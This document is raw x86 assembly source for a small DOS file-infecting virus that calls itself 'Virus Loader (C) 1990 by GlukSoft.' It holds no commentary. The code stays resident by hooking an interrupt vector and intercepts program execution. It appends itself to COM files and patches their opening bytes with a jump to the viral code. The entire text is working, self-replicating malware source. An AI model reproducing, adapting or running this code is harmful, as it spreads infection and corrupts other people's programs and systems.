

.286
.model tiny
.radix 16
.code
	org	100
a	db	0E9
	dw	d-b
b:	mov	ah,9
	int	21
	ret
c	db	'Virus Loader (C) 1990 by GlukSoft.',0DH,0A,24
d:	pusha
	mov	di,si
	call	e
e:	pop	si
	add	si,g-e
	movsb
	movsw
	mov	ax,h-d
	mov	es,ax
	xor	di,di
	sub	si,ax
	pusha
	cmpsw
	popa
	mov	cl,(k-d)/2
	rep	movsw
	jz	f
	mov	ds,cx
	lea	si,[di-8]
	movsw
	mov	[si-2],ax
	xchg	[si],ax
	stosw
	push	cs
	pop	ds
f:	push	cs
	pop	es
	popa
	jmp	si
	db	0E9
g:	mov	dx,offset c
h:	pusha
	push	ds
	xor	ah,4BH
	jnz	j
	mov	ax,3D02
	int	0F7
	jc	j
	mov	bx,ax
	push	cs
	pop	ds
	mov	ah,3F
	mov	cx,3
	mov	dx,g-d
	mov	si,dx
	int	0F7
	cmp	byte ptr [si],'M'
	jz	i
	mov	ax,4202
	xor	cx,cx
	xor	dx,dx
	int	0F7
	sub	ax,3
	mov	bp,ax
	mov	cl,k-d
	sub	ax,cx
	cmp	ax,[si+1]
	jz	i
	mov	ah,40
	int	0F7
	mov	ax,4200
	xor	cx,cx
	int	0F7
	mov	ah,40
	lea	dx,[si-1]
	mov	cl,3
	mov	[si],bp
	int	0F7
i:	mov	ah,3E
	int	0F7
j:	pop	ds
	popa
	db	0EA
k:
end	a

